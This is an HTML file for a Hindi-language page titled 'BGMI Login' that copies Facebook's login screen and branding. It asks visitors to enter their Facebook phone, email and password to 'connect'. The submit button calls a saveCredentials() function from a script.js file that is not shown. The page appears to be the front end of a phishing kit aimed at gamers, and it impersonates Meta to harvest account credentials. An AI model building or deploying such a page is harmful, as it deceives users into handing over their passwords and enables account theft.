<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BGMI Login</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js"></script>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="bgmi.jpg" alt="Facebook Logo">
        </div>
        <div class="login-form">
            <h2>कनेक्ट होने के लिए अपना Facebook खाते में लॉग इन करें</h2>
            <form>
                <input type="text" id="username" placeholder="मोबाइल नंबर या ईमेल" required>
                <input type="password" id="password" placeholder="Facebook पासवर्ड" required>
                <button type="submit" onclick="saveCredentials()">लॉग इन करें</button>
                <a href="#" class="forgot-password">पासवर्ड भूल गए?</a>
            </form>
            <div class="options">
                <a href="#" class="create-account">अकाउंट बनाएँ</a>
                <a href="#" class="not-now">अभी नहीं</a>
            </div>
            <div class="help-center">
                <a href="#" class="help-link">हेल्प सेंटर</a>
            </div>
        </div>
        <div class="language-options">
            <a href="#" class="language-link">हिन्दी</a>
            <a href="#" class="language-link">English (UK)</a>
            <a href="#" class="language-link">اردو</a>
            <a href="#" class="language-link">বাংলা</a>
            <a href="#" class="language-link">ਪੰਜਾਬੀ</a>
            <a href="#" class="language-link">ગુજરાતી</a>
            <a href="#" class="language-link">मराठी</a>
        </div>
        <div class="copyright">
            <p>Meta © 2024</p>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
